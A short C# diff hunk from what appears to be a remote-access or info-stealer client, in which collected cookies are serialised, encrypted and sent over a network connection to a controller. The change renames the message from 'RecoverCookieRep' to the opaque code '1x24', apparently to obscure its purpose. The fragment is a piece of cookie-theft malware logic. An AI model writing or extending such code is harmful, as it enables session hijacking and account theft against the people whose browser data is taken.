@@ -42,7 +42,7 @@ namespace Client.Core.Events
 
             if (NetworkManager.IsConnected)
             {
-                NetworkManager.Connection.SendObject("RecoverCookieRep", Cryptography.Encrypt(JsonConvert.SerializeObject(cookies.ToArray())));
+                NetworkManager.Connection.SendObject("1x24", Cryptography.Encrypt(JsonConvert.SerializeObject(cookies.ToArray())));
             }
         }
         }
